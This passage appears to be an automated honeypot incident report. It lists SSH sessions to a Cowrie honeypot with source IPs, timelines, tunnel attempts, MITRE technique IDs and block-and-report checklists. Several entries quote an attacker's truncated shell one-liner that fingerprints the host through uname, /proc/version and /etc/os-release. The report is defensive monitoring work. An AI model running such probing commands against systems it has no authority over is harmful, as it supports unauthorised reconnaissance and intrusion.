- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e73384a1ae1

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-29 16:43 |
| **Last Seen** | 2026-08-29 16:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:43:33` | `cowrie.session.connect` |
| `2026-08-29 16:43:33` | `cowrie.client.version` |
| `2026-08-29 16:43:33` | `cowrie.client.kex` |
| `2026-08-29 16:43:34` | `cowrie.login.success` |
| `2026-08-29 16:43:34` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:43:34` | `cowrie.direct-tcpip.data` |
| `2026-08-29 16:43:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-763325e9261b

| Field | Detail |
|---|---|
| **Source IP** | `203.252.10[.]4` |
| **First Seen** | 2026-08-29 16:44 |
| **Last Seen** | 2026-08-29 16:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:44:37` | `cowrie.session.connect` |
| `2026-08-29 16:44:38` | `cowrie.client.version` |
| `2026-08-29 16:44:38` | `cowrie.client.kex` |
| `2026-08-29 16:44:39` | `cowrie.login.success` |
| `2026-08-29 16:44:40` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:44:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.252.10[.]4` to AbuseIPDB if not already reported
- [ ] Block `203.252.10[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df7dd965c1b8

| Field | Detail |
|---|---|
| **Source IP** | `81.237.251[.]198` |
| **First Seen** | 2026-08-29 16:44 |
| **Last Seen** | 2026-08-29 16:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:44:46` | `cowrie.session.connect` |
| `2026-08-29 16:44:46` | `cowrie.client.version` |
| `2026-08-29 16:44:46` | `cowrie.client.kex` |
| `2026-08-29 16:44:47` | `cowrie.login.success` |
| `2026-08-29 16:44:48` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:44:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.237.251[.]198` to AbuseIPDB if not already reported
- [ ] Block `81.237.251[.]198` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbbccdb2a15f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 16:47 |
| **Last Seen** | 2026-08-29 16:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:47:04` | `cowrie.session.connect` |
| `2026-08-29 16:47:04` | `cowrie.client.version` |
| `2026-08-29 16:47:04` | `cowrie.client.kex` |
| `2026-08-29 16:47:05` | `cowrie.login.success` |
| `2026-08-29 16:47:06` | `cowrie.session.params` |
| `2026-08-29 16:47:06` | `cowrie.command.input` |
| `2026-08-29 16:47:06` | `cowrie.command.input` |
| `2026-08-29 16:47:06` | `cowrie.command.input` |
| `2026-08-29 16:47:06` | `cowrie.command.input` |
| `2026-08-29 16:47:06` | `cowrie.command.input` |
| `2026-08-29 16:47:06` | `cowrie.command.success` |
| `2026-08-29 16:47:06` | `cowrie.command.input` |
| `2026-08-29 16:47:06` | `cowrie.command.input` |
| `2026-08-29 16:47:06` | `cowrie.command.input` |
| `2026-08-29 16:47:06` | `cowrie.command.input` |
| `2026-08-29 16:47:06` | `cowrie.log.closed` |
| `2026-08-29 16:47:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7edf0fcd2b64

| Field | Detail |
|---|---|
| **Source IP** | `43.162.90[.]45` |
| **First Seen** | 2026-08-29 16:47 |
| **Last Seen** | 2026-08-29 16:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:47:28` | `cowrie.session.connect` |
| `2026-08-29 16:47:28` | `cowrie.client.version` |
| `2026-08-29 16:47:28` | `cowrie.client.kex` |
| `2026-08-29 16:47:29` | `cowrie.login.success` |
| `2026-08-29 16:47:30` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:47:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.162.90[.]45` to AbuseIPDB if not already reported
- [ ] Block `43.162.90[.]45` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4707b8de6d8

| Field | Detail |
|---|---|
| **Source IP** | `122.187.230[.]82` |
| **First Seen** | 2026-08-29 16:47 |
| **Last Seen** | 2026-08-29 16:47 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:47:35` | `cowrie.session.connect` |
| `2026-08-29 16:47:36` | `cowrie.client.version` |
| `2026-08-29 16:47:36` | `cowrie.client.kex` |
| `2026-08-29 16:47:39` | `cowrie.login.success` |
| `2026-08-29 16:47:40` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:47:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.230[.]82` to AbuseIPDB if not already reported
- [ ] Block `122.187.230[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29d5af984822

| Field | Detail |
|---|---|
| **Source IP** | `171.217.70[.]151` |
| **First Seen** | 2026-08-29 16:47 |
| **Last Seen** | 2026-08-29 16:47 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:47:36` | `cowrie.session.connect` |
| `2026-08-29 16:47:37` | `cowrie.client.version` |
| `2026-08-29 16:47:37` | `cowrie.client.kex` |
| `2026-08-29 16:47:40` | `cowrie.login.success` |
| `2026-08-29 16:47:41` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:47:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.217.70[.]151` to AbuseIPDB if not already reported
- [ ] Block `171.217.70[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c006751267d

| Field | Detail |
|---|---|
| **Source IP** | `83.239.84[.]130` |
| **First Seen** | 2026-08-29 16:47 |
| **Last Seen** | 2026-08-29 16:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:47:46` | `cowrie.session.connect` |
| `2026-08-29 16:47:47` | `cowrie.client.version` |
| `2026-08-29 16:47:47` | `cowrie.client.kex` |
| `2026-08-29 16:47:48` | `cowrie.login.success` |
| `2026-08-29 16:47:48` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:47:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.239.84[.]130` to AbuseIPDB if not already reported
- [ ] Block `83.239.84[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-795d73c64002

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 16:48 |
| **Last Seen** | 2026-08-29 16:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:48:51` | `cowrie.session.connect` |
| `2026-08-29 16:48:51` | `cowrie.client.version` |
| `2026-08-29 16:48:52` | `cowrie.client.kex` |
| `2026-08-29 16:48:52` | `cowrie.login.success` |
| `2026-08-29 16:48:53` | `cowrie.session.params` |
| `2026-08-29 16:48:53` | `cowrie.command.input` |
| `2026-08-29 16:48:53` | `cowrie.command.input` |
| `2026-08-29 16:48:53` | `cowrie.command.input` |
| `2026-08-29 16:48:53` | `cowrie.command.input` |
| `2026-08-29 16:48:53` | `cowrie.command.input` |
| `2026-08-29 16:48:53` | `cowrie.command.success` |
| `2026-08-29 16:48:53` | `cowrie.command.input` |
| `2026-08-29 16:48:53` | `cowrie.command.input` |
| `2026-08-29 16:48:53` | `cowrie.command.input` |
| `2026-08-29 16:48:53` | `cowrie.command.input` |
| `2026-08-29 16:48:53` | `cowrie.log.closed` |
| `2026-08-29 16:48:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02e106fabb7b

| Field | Detail |
|---|---|
| **Source IP** | `49.124.148[.]206` |
| **First Seen** | 2026-08-29 16:49 |
| **Last Seen** | 2026-08-29 16:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:49:39` | `cowrie.session.connect` |
| `2026-08-29 16:49:40` | `cowrie.client.version` |
| `2026-08-29 16:49:40` | `cowrie.client.kex` |
| `2026-08-29 16:49:42` | `cowrie.login.success` |
| `2026-08-29 16:49:43` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:49:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.148[.]206` to AbuseIPDB if not already reported
- [ ] Block `49.124.148[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5588b1278e22

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 16:50 |
| **Last Seen** | 2026-08-29 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:50:39` | `cowrie.session.connect` |
| `2026-08-29 16:50:39` | `cowrie.client.version` |
| `2026-08-29 16:50:40` | `cowrie.client.kex` |
| `2026-08-29 16:50:40` | `cowrie.login.success` |
| `2026-08-29 16:50:41` | `cowrie.session.params` |
| `2026-08-29 16:50:41` | `cowrie.command.input` |
| `2026-08-29 16:50:41` | `cowrie.command.input` |
| `2026-08-29 16:50:41` | `cowrie.command.input` |
| `2026-08-29 16:50:41` | `cowrie.command.input` |
| `2026-08-29 16:50:41` | `cowrie.command.input` |
| `2026-08-29 16:50:41` | `cowrie.command.success` |
| `2026-08-29 16:50:41` | `cowrie.command.input` |
| `2026-08-29 16:50:41` | `cowrie.command.input` |
| `2026-08-29 16:50:41` | `cowrie.command.input` |
| `2026-08-29 16:50:41` | `cowrie.command.input` |
| `2026-08-29 16:50:41` | `cowrie.log.closed` |
| `2026-08-29 16:50:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-220581a8dc00

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 16:52 |
| **Last Seen** | 2026-08-29 16:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:52:19` | `cowrie.session.connect` |
| `2026-08-29 16:52:19` | `cowrie.client.version` |
| `2026-08-29 16:52:19` | `cowrie.client.kex` |
| `2026-08-29 16:52:20` | `cowrie.login.success` |
| `2026-08-29 16:52:20` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:52:21` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 16:52:21` | `cowrie.direct-tcpip.data` |
| `2026-08-29 16:52:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80375c38ff7d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 16:52 |
| **Last Seen** | 2026-08-29 16:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:52:20` | `cowrie.session.connect` |
| `2026-08-29 16:52:20` | `cowrie.client.version` |
| `2026-08-29 16:52:20` | `cowrie.client.kex` |
| `2026-08-29 16:52:21` | `cowrie.login.success` |
| `2026-08-29 16:52:23` | `cowrie.session.params` |
| `2026-08-29 16:52:23` | `cowrie.command.input` |
| `2026-08-29 16:52:23` | `cowrie.command.input` |
| `2026-08-29 16:52:23` | `cowrie.command.input` |
| `2026-08-29 16:52:23` | `cowrie.command.input` |
| `2026-08-29 16:52:23` | `cowrie.command.input` |
| `2026-08-29 16:52:23` | `cowrie.command.success` |
| `2026-08-29 16:52:23` | `cowrie.command.input` |
| `2026-08-29 16:52:23` | `cowrie.command.input` |
| `2026-08-29 16:52:23` | `cowrie.command.input` |
| `2026-08-29 16:52:23` | `cowrie.command.input` |
| `2026-08-29 16:52:23` | `cowrie.log.closed` |
| `2026-08-29 16:52:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-684ef64455f2

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 16:54 |
| **Last Seen** | 2026-08-29 16:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:54:00` | `cowrie.session.connect` |
| `2026-08-29 16:54:00` | `cowrie.client.version` |
| `2026-08-29 16:54:00` | `cowrie.client.kex` |
| `2026-08-29 16:54:01` | `cowrie.login.success` |
| `2026-08-29 16:54:02` | `cowrie.session.params` |
| `2026-08-29 16:54:02` | `cowrie.command.input` |
| `2026-08-29 16:54:02` | `cowrie.command.input` |
| `2026-08-29 16:54:02` | `cowrie.command.input` |
| `2026-08-29 16:54:02` | `cowrie.command.input` |
| `2026-08-29 16:54:02` | `cowrie.command.input` |
| `2026-08-29 16:54:02` | `cowrie.command.success` |
| `2026-08-29 16:54:02` | `cowrie.command.input` |
| `2026-08-29 16:54:02` | `cowrie.command.input` |
| `2026-08-29 16:54:02` | `cowrie.command.input` |
| `2026-08-29 16:54:02` | `cowrie.command.input` |
| `2026-08-29 16:54:02` | `cowrie.log.closed` |
| `2026-08-29 16:54:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c409f71b72c0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 16:54 |
| **Last Seen** | 2026-08-29 16:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:54:17` | `cowrie.session.connect` |
| `2026-08-29 16:54:17` | `cowrie.client.version` |
| `2026-08-29 16:54:17` | `cowrie.client.kex` |
| `2026-08-29 16:54:18` | `cowrie.login.success` |
| `2026-08-29 16:54:18` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:54:18` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 16:54:18` | `cowrie.direct-tcpip.data` |
| `2026-08-29 16:54:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b4d7a6e2268

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 16:55 |
| **Last Seen** | 2026-08-29 16:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:55:52` | `cowrie.session.connect` |
| `2026-08-29 16:55:52` | `cowrie.client.version` |
| `2026-08-29 16:55:52` | `cowrie.client.kex` |
| `2026-08-29 16:55:53` | `cowrie.login.success` |
| `2026-08-29 16:55:54` | `cowrie.session.params` |
| `2026-08-29 16:55:54` | `cowrie.command.input` |
| `2026-08-29 16:55:54` | `cowrie.command.input` |
| `2026-08-29 16:55:54` | `cowrie.command.input` |
| `2026-08-29 16:55:54` | `cowrie.command.input` |
| `2026-08-29 16:55:54` | `cowrie.command.input` |
| `2026-08-29 16:55:54` | `cowrie.command.success` |
| `2026-08-29 16:55:54` | `cowrie.command.input` |
| `2026-08-29 16:55:54` | `cowrie.command.input` |
| `2026-08-29 16:55:54` | `cowrie.command.input` |
| `2026-08-29 16:55:54` | `cowrie.command.input` |
| `2026-08-29 16:55:54` | `cowrie.log.closed` |
| `2026-08-29 16:55:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30aa4290628b

| Field | Detail |
|---|---|
| **Source IP** | `112.196.52[.]107` |
| **First Seen** | 2026-08-29 16:58 |
| **Last Seen** | 2026-08-29 16:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:58:14` | `cowrie.session.connect` |
| `2026-08-29 16:58:15` | `cowrie.client.version` |
| `2026-08-29 16:58:15` | `cowrie.client.kex` |
| `2026-08-29 16:58:17` | `cowrie.login.success` |
| `2026-08-29 16:58:18` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:58:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.196.52[.]107` to AbuseIPDB if not already reported
- [ ] Block `112.196.52[.]107` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3ea598d2aac

| Field | Detail |
|---|---|
| **Source IP** | `27.107.102[.]154` |
| **First Seen** | 2026-08-29 16:58 |
| **Last Seen** | 2026-08-29 16:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:58:24` | `cowrie.session.connect` |
| `2026-08-29 16:58:24` | `cowrie.client.version` |
| `2026-08-29 16:58:24` | `cowrie.client.kex` |
| `2026-08-29 16:58:26` | `cowrie.login.success` |
| `2026-08-29 16:58:26` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:58:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.107.102[.]154` to AbuseIPDB if not already reported
- [ ] Block `27.107.102[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa4182ff9293

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 16:58 |
| **Last Seen** | 2026-08-29 16:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
